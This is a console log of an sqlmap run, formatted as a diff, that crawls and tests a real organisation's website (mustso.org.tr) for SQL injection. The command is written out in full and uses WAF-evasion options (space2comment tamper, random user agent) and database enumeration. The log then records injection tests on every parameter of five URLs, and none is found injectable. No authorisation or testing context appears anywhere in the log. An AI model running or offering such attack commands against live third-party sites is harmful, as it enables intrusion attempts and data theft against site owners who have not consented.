@@ -1,0 +1,351 @@
+
+C:\Users\burak\OneDrive\Masaüstü\asdas\sqlmap-dev>python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --dbms=postgresql --tamper=space2comment --random-agent --time-sec=10
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.6.8.3#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:53:33 /2022-08-26/
+
+[15:53:33] [INFO] loading tamper module 'space2comment'
+[15:53:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86-64; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0' from file 'C:\Users\burak\OneDrive\Masaüstü\asdas\sqlmap-dev\data\txt\user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] y
+[15:53:36] [WARNING] 'sitemap.xml' not found
+[15:53:36] [INFO] starting crawler for target URL 'https://www.mustso.org.tr/Default.aspx'
+[15:53:36] [INFO] searching for links with depth 1
+[15:53:38] [INFO] searching for links with depth 2
+please enter number of threads? [Enter for 1 (current)] 1
+[15:53:40] [WARNING] running in a single-thread mode. This could take a while
+[15:54:13] [INFO] 74/86 links visited (86%)
+[15:54:13] [WARNING] potential CAPTCHA protection mechanism detected
+do you want to normalize crawling results [Y/n] y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] y
+[15:54:34] [INFO] writing crawling results to a temporary file 'C:\Users\burak\AppData\Local\Temp\sqlmapx74cgbc42656\sqlmapcrawler-ao2_pyk9.csv'
+[15:54:37] [INFO] found a total of 5 targets
+[1/5] URL:
+GET https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/ImageHandler.ashx?Width=990&Height=660&HomeDirectory=/Portals/348/&FileName=HaberFoto/ba%c5%9fkan ko%c3%a7, birlikle a%c5%9famayaca%c4%9f%c4%b1m%c4%b1z hi%c3%a7 bir engel yoktur (1).jpg&PortalID=348&q=1
+do you want to test this URL? [Y/n/q]
+> y
+[15:54:45] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/ImageHandler.ashx?Width=990&Height=660&HomeDirectory=/Portals/348/&FileName=HaberFoto/ba%c5%9fkan ko%c3%a7, birlikle a%c5%9famayaca%c4%9f%c4%b1m%c4%b1z hi%c3%a7 bir engel yoktur (1).jpg&PortalID=348&q=1'
+it appears that provided value for GET parameter 'HomeDirectory' has boundaries. Do you want to inject inside? ('/Portals/348*/') [y/N] y
+[15:54:48] [INFO] using 'C:\Users\burak\AppData\Local\sqlmap\output\results-08262022_0354pm.csv' as the CSV results file in multiple targets mode
+you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=_RT22tzv2AE...iYWYyZjFh0'). Do you want to use those [Y/n] y
+[15:55:17] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[15:55:17] [INFO] testing if the target URL content is stable
+[15:55:19] [INFO] target URL content is stable
+[15:55:19] [INFO] testing if GET parameter 'Width' is dynamic
+[15:55:20] [WARNING] GET parameter 'Width' does not appear to be dynamic
+[15:55:22] [WARNING] heuristic (basic) test shows that GET parameter 'Width' might not be injectable
+[15:55:23] [INFO] testing for SQL injection on GET parameter 'Width'
+[15:55:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:55:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:55:31] [INFO] testing 'Generic inline queries'
+[15:55:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:55:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:55:34] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)
+[15:55:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[15:56:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:56:43] [WARNING] GET parameter 'Width' does not seem to be injectable
+[15:56:43] [INFO] testing if GET parameter 'Height' is dynamic
+[15:56:44] [WARNING] GET parameter 'Height' does not appear to be dynamic
+[15:56:44] [WARNING] heuristic (basic) test shows that GET parameter 'Height' might not be injectable
+[15:56:45] [INFO] testing for SQL injection on GET parameter 'Height'
+[15:56:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:56:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:56:50] [INFO] testing 'Generic inline queries'
+[15:56:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:56:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:56:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:57:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:57:07] [WARNING] GET parameter 'Height' does not seem to be injectable
+[15:57:07] [INFO] testing if GET parameter 'HomeDirectory' is dynamic
+[15:57:07] [WARNING] GET parameter 'HomeDirectory' does not appear to be dynamic
+[15:57:07] [WARNING] heuristic (basic) test shows that GET parameter 'HomeDirectory' might not be injectable
+[15:57:07] [INFO] testing for SQL injection on GET parameter 'HomeDirectory'
+[15:57:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:57:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:57:12] [INFO] testing 'Generic inline queries'
+[15:57:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:57:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:57:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:57:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:57:28] [WARNING] GET parameter 'HomeDirectory' does not seem to be injectable
+[15:57:28] [INFO] testing if GET parameter 'FileName' is dynamic
+[15:57:28] [WARNING] GET parameter 'FileName' does not appear to be dynamic
+[15:57:28] [WARNING] heuristic (basic) test shows that GET parameter 'FileName' might not be injectable
+[15:57:29] [INFO] testing for SQL injection on GET parameter 'FileName'
+[15:57:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:57:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:57:33] [INFO] testing 'Generic inline queries'
+[15:57:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:57:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:57:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:57:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:57:56] [WARNING] GET parameter 'FileName' does not seem to be injectable
+[15:57:56] [INFO] testing if GET parameter 'PortalID' is dynamic
+[15:57:57] [INFO] GET parameter 'PortalID' appears to be dynamic
+[15:58:06] [WARNING] heuristic (basic) test shows that GET parameter 'PortalID' might not be injectable
+[15:58:07] [INFO] testing for SQL injection on GET parameter 'PortalID'
+[15:58:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:58:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:58:13] [INFO] testing 'Generic inline queries'
+[15:58:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:58:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:58:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:58:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:58:39] [WARNING] GET parameter 'PortalID' does not seem to be injectable
+[15:58:39] [INFO] testing if GET parameter 'q' is dynamic
+[15:58:40] [WARNING] GET parameter 'q' does not appear to be dynamic
+[15:58:40] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[15:58:41] [INFO] testing for SQL injection on GET parameter 'q'
+[15:58:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:58:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:58:53] [INFO] testing 'Generic inline queries'
+[15:58:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:59:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[15:59:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:59:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:59:45] [WARNING] GET parameter 'q' does not seem to be injectable
+[15:59:45] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests, skipping to the next target
+[15:59:45] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 4 times, 500 (Internal Server Error) - 80 times
+[2/5] URL:
+GET https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/Rss.aspx?TabID=17222&ModuleID=23961&MaxCount=25
+do you want to test this URL? [Y/n/q]
+> y
+[16:04:04] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/Rss.aspx?TabID=17222&ModuleID=23961&MaxCount=25'
+you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=J-54J97v2AE...jMDkwYTUz0'). Do you want to use those [Y/n] y
+[16:07:39] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:07:39] [INFO] testing if the target URL content is stable
+[16:07:40] [INFO] target URL content is stable
+[16:07:40] [INFO] testing if GET parameter 'TabID' is dynamic
+got a 302 redirect to 'https://www.mustso.org.tr/'. Do you want to follow? [Y/n] y
+[16:09:17] [INFO] GET parameter 'TabID' appears to be dynamic
+[16:09:22] [INFO] heuristic (basic) test shows that GET parameter 'TabID' might be injectable
+[16:09:25] [INFO] testing for SQL injection on GET parameter 'TabID'
+[16:09:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:09:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:09:45] [INFO] testing 'Generic inline queries'
+[16:09:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:09:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:09:48] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
+[16:09:53] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[16:09:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[16:10:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:10:16] [WARNING] GET parameter 'TabID' does not seem to be injectable
+[16:10:16] [WARNING] GET parameter 'ModuleID' does not appear to be dynamic
+[16:10:17] [WARNING] heuristic (basic) test shows that GET parameter 'ModuleID' might not be injectable
+[16:10:17] [INFO] testing for SQL injection on GET parameter 'ModuleID'
+[16:10:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:10:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:10:22] [INFO] testing 'Generic inline queries'
+[16:10:23] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:10:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:10:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:10:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:10:28] [WARNING] GET parameter 'ModuleID' does not seem to be injectable
+[16:10:28] [WARNING] GET parameter 'MaxCount' does not appear to be dynamic
+[16:10:31] [WARNING] heuristic (basic) test shows that GET parameter 'MaxCount' might not be injectable
+[16:10:32] [INFO] testing for SQL injection on GET parameter 'MaxCount'
+[16:10:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:10:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:10:45] [INFO] testing 'Generic inline queries'
+[16:10:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:10:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:11:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:11:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:11:24] [WARNING] GET parameter 'MaxCount' does not seem to be injectable
+[16:11:24] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests, skipping to the next target
+[3/5] URL:
+GET https://www.mustso.org.tr/DesktopModules/SimpleGallery/ImageHandler.ashx?width=200&height=200&HomeDirectory=/Portals/348/Gallery/Album/1161&fileName=1.jpg&portalid=348&i=19935&q=1&s=1
+do you want to test this URL? [Y/n/q]
+> y
+[16:12:06] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/SimpleGallery/ImageHandler.ashx?width=200&height=200&HomeDirectory=/Portals/348/Gallery/Album/1161&fileName=1.jpg&portalid=348&i=19935&q=1&s=1'
+you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=_GRPRt_v2AE...5NWVlZTBi0'). Do you want to use those [Y/n] y
+[16:12:21] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:12:21] [INFO] testing if the target URL content is stable
+[16:12:22] [INFO] target URL content is stable
+[16:12:22] [INFO] testing if GET parameter 'width' is dynamic
+[16:12:22] [INFO] GET parameter 'width' appears to be dynamic
+[16:12:23] [WARNING] heuristic (basic) test shows that GET parameter 'width' might not be injectable
+[16:12:23] [INFO] testing for SQL injection on GET parameter 'width'
+[16:12:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:12:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:12:27] [INFO] testing 'Generic inline queries'
+[16:12:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:12:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:12:30] [WARNING] time-based comparison requires larger statistical model, please wait...... (done)
+[16:12:40] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[16:13:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:13:19] [WARNING] GET parameter 'width' does not seem to be injectable
+[16:13:19] [INFO] testing if GET parameter 'height' is dynamic
+[16:13:19] [INFO] GET parameter 'height' appears to be dynamic
+[16:13:21] [WARNING] heuristic (basic) test shows that GET parameter 'height' might not be injectable
+[16:13:22] [INFO] testing for SQL injection on GET parameter 'height'
+[16:13:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:13:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:13:33] [INFO] testing 'Generic inline queries'
+[16:13:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:13:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:13:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:13:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:13:51] [WARNING] GET parameter 'height' does not seem to be injectable
+[16:13:51] [INFO] testing if GET parameter 'HomeDirectory' is dynamic
+[16:13:51] [WARNING] GET parameter 'HomeDirectory' does not appear to be dynamic
+[16:13:51] [WARNING] heuristic (basic) test shows that GET parameter 'HomeDirectory' might not be injectable
+[16:13:53] [INFO] testing for SQL injection on GET parameter 'HomeDirectory'
+[16:13:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:14:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:14:02] [INFO] testing 'Generic inline queries'
+[16:14:03] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:14:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:14:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:14:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:14:16] [WARNING] GET parameter 'HomeDirectory' does not seem to be injectable
+[16:14:16] [INFO] testing if GET parameter 'fileName' is dynamic
+[16:14:16] [WARNING] GET parameter 'fileName' does not appear to be dynamic
+[16:14:16] [WARNING] heuristic (basic) test shows that GET parameter 'fileName' might not be injectable
+[16:14:17] [INFO] testing for SQL injection on GET parameter 'fileName'
+[16:14:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:14:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:14:20] [INFO] testing 'Generic inline queries'
+[16:14:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:14:22] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:14:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:14:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:14:37] [WARNING] GET parameter 'fileName' does not seem to be injectable
+[16:14:37] [INFO] testing if GET parameter 'portalid' is dynamic
+[16:14:38] [WARNING] GET parameter 'portalid' does not appear to be dynamic
+[16:14:38] [WARNING] heuristic (basic) test shows that GET parameter 'portalid' might not be injectable
+[16:14:39] [INFO] testing for SQL injection on GET parameter 'portalid'
+[16:14:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:14:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:14:42] [INFO] testing 'Generic inline queries'
+[16:14:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:14:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:14:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:14:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:14:53] [WARNING] GET parameter 'portalid' does not seem to be injectable
+[16:14:53] [INFO] testing if GET parameter 'i' is dynamic
+[16:14:53] [WARNING] GET parameter 'i' does not appear to be dynamic
+[16:14:54] [WARNING] heuristic (basic) test shows that GET parameter 'i' might not be injectable
+[16:14:55] [INFO] testing for SQL injection on GET parameter 'i'
+[16:14:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:14:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:14:58] [INFO] testing 'Generic inline queries'
+[16:14:58] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:15:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:15:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:15:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:15:08] [WARNING] GET parameter 'i' does not seem to be injectable
+[16:15:08] [INFO] testing if GET parameter 'q' is dynamic
+[16:15:08] [WARNING] GET parameter 'q' does not appear to be dynamic
+[16:15:09] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[16:15:09] [INFO] testing for SQL injection on GET parameter 'q'
+[16:15:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:15:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:15:13] [INFO] testing 'Generic inline queries'
+[16:15:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:15:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:15:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:15:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:15:30] [WARNING] GET parameter 'q' does not seem to be injectable
+[16:15:30] [INFO] testing if GET parameter 's' is dynamic
+[16:15:31] [INFO] GET parameter 's' appears to be dynamic
+[16:15:32] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable
+[16:15:32] [INFO] testing for SQL injection on GET parameter 's'
+[16:15:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:15:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:15:37] [INFO] testing 'Generic inline queries'
+[16:15:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:15:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:15:40] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:15:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:15:44] [WARNING] GET parameter 's' does not seem to be injectable
+[16:15:44] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests, skipping to the next target
+[16:15:44] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 72 times
+[4/5] URL:
+GET https://www.mustso.org.tr/WebResource.axd?d=uI6_Y3mZloGbByzIhKKf1OQePkQCUK_zid-cTvmw3sBFoiiqaEmsYeUFXhxnL2EpZmaRS8DN81BwrVrA0&t=637290871100000000
+do you want to test this URL? [Y/n/q]
+> y
+[16:18:44] [INFO] testing URL 'https://www.mustso.org.tr/WebResource.axd?d=uI6_Y3mZloGbByzIhKKf1OQePkQCUK_zid-cTvmw3sBFoiiqaEmsYeUFXhxnL2EpZmaRS8DN81BwrVrA0&t=637290871100000000'
+[16:18:45] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:18:45] [INFO] testing if the target URL content is stable
+[16:18:46] [INFO] target URL content is stable
+[16:18:46] [INFO] testing if GET parameter 'd' is dynamic
+[16:18:46] [WARNING] GET parameter 'd' does not appear to be dynamic
+[16:18:46] [WARNING] heuristic (basic) test shows that GET parameter 'd' might not be injectable
+[16:18:47] [INFO] testing for SQL injection on GET parameter 'd'
+[16:18:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:18:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:18:51] [INFO] testing 'Generic inline queries'
+[16:18:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:18:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:18:53] [WARNING] time-based comparison requires larger statistical model, please wait........ (done)
+[16:18:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[16:19:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:19:50] [WARNING] GET parameter 'd' does not seem to be injectable
+[16:19:50] [INFO] testing if GET parameter 't' is dynamic
+[16:19:51] [WARNING] GET parameter 't' does not appear to be dynamic
+[16:19:51] [WARNING] heuristic (basic) test shows that GET parameter 't' might not be injectable
+[16:19:51] [INFO] testing for SQL injection on GET parameter 't'
+[16:19:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:19:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:19:53] [INFO] testing 'Generic inline queries'
+[16:19:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:19:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:19:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:19:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:20:02] [WARNING] GET parameter 't' does not seem to be injectable
+[16:20:02] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests, skipping to the next target
+[16:20:02] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 35 times
+[5/5] URL:
+GET https://www.mustso.org.tr/DesktopModules/ProModules/ImageChallenge.captcha.aspx?captcha=D236B36F3F5113564B8349C3CC75138C027C74B98DF299F018100A0A4B9BDB5598AF899CD7155461C9ADD060C0A065EFC96EA1E832F185F4D371D69882F1EA7A1B111A2C69384197D08BD7FC992BCEAAA4AB3AAA7E1325BC4D0D223DA57F07BAF16E93F2F8CF160115B273C9132F038532B7B7C2A4D7431F7DE7EDBBD99B6955DBBB556FCD47F57F30B9C15FF33054CF6CF0E9DD114704F4970221C529B3125674862045&alias=www.mustso.org.tr
+do you want to test this URL? [Y/n/q]
+> y
+[16:20:17] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/ProModules/ImageChallenge.captcha.aspx?captcha=D236B36F3F5113564B8349C3CC75138C027C74B98DF299F018100A0A4B9BDB5598AF899CD7155461C9ADD060C0A065EFC96EA1E832F185F4D371D69882F1EA7A1B111A2C69384197D08BD7FC992BCEAAA4AB3AAA7E1325BC4D0D223DA57F07BAF16E93F2F8CF160115B273C9132F038532B7B7C2A4D7431F7DE7EDBBD99B6955DBBB556FCD47F57F30B9C15FF33054CF6CF0E9DD114704F4970221C529B3125674862045&alias=www.mustso.org.tr'
+you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=ecVMauDv2AE...2ZGUzOGVh0'). Do you want to use those [Y/n] y
+[16:20:18] [INFO] testing if the target URL content is stable
+[16:20:18] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[16:20:18] [INFO] testing if GET parameter 'captcha' is dynamic
+[16:20:19] [WARNING] GET parameter 'captcha' does not appear to be dynamic
+[16:20:19] [WARNING] heuristic (basic) test shows that GET parameter 'captcha' might not be injectable
+[16:20:19] [INFO] testing for SQL injection on GET parameter 'captcha'
+[16:20:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:20:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:20:23] [INFO] testing 'Generic inline queries'
+[16:20:23] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:20:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:20:25] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
+[16:20:37] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[16:21:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:21:23] [WARNING] GET parameter 'captcha' does not seem to be injectable
+[16:21:23] [INFO] testing if GET parameter 'alias' is dynamic
+[16:21:24] [WARNING] GET parameter 'alias' does not appear to be dynamic
+[16:21:24] [WARNING] heuristic (basic) test shows that GET parameter 'alias' might not be injectable
+[16:21:25] [INFO] testing for SQL injection on GET parameter 'alias'
+[16:21:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:21:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:21:27] [INFO] testing 'Generic inline queries'
+[16:21:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:21:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:21:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:21:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:21:43] [WARNING] GET parameter 'alias' does not seem to be injectable
+[16:21:43] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests, skipping to the next target
+[16:21:43] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 7 times, 404 (Not Found) - 2 times
+[16:21:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\burak\AppData\Local\sqlmap\output\results-08262022_0354pm.csv'
+
+[*] ending @ 16:21:43 /2022-08-26/
